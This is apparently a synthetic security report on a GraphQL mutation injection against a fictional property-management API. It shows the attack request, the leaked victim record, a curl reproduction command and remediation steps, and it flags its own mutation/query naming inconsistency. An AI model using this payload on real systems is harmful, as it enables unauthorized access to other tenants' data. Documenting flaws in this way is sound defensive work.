# Security Analysis Report
**System:** StayPro Property API
**Domain:** Hospitality / Property Management
**Example ID:** GQL-0280
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Injection — Pattern 5.2 | Resolver/graph traversal injection on `updateResource` — attacker traverses graph to read unauthorized hospitality property records |

---

## Finding 1 — Injection: Resolver/Graph Traversal Injection via Mutation Input (Pattern 5.2)

### Summary
The GraphQL API at `https://api.staypro-property-api.example.com/graphql` exposes an `updateResource` mutation whose input object is used to traverse the resolver graph to unauthorized records. The attacker injects `ownerId: "attacker-0056bdc2"` in the mutation input, and the resolver returns the victim's property record under the `getResource` key (see inconsistency note below), constituting a graph traversal injection.

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2280", input: {status: "approved", ownerId: "attacker-0056bdc2"})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-0056bdc2` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 5.2 — Resolver/graph traversal injection (Injection)
**Affected endpoint:** `POST https://api.staypro-property-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation with graph traversal)**
```
POST https://api.staypro-property-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2280\", input: {status: \"approved\", ownerId: \"attacker-0056bdc2\"}) { resourceId status } }"}
```

**Response — Victim Property Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-bdc2",
      "ownerId": "other-user-0056bdc2",
      "data": {
        "sensitiveField": "CONFIDENTIAL-0056bdc2",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.staypro-property-api.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2280\", input: {status: \"approved\", ownerId: \"attacker-0056bdc2\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-bdc2, sensitiveField: CONFIDENTIAL-0056bdc2
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Remove `ownerId` and `tenantId` from writable mutation inputs.
2. Resolver must validate `object.tenantId` against JWT `tenantId` before executing mutation or returning fields.
3. Restrict response selection to fields the caller is authorized to read.
